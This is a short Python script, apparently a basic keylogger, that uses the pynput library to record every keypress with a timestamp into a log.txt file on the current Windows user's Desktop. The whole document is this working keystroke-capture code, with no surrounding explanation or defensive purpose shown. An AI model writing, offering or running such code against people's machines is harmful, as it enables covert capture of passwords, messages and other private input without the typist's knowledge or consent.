from pynput.keyboard import Listener
import os
import logging

user = os.getlogin()
directory = f"C:/Users/{user}/Desktop"
logging.basicConfig(filename=f"{directory}/log.txt",level=logging.DEBUG,format="%(asctime)s: %(message)s")

def handler(key):
    logging.info(key)

with Listener(on_press=handler) as listener:
    listener.join()
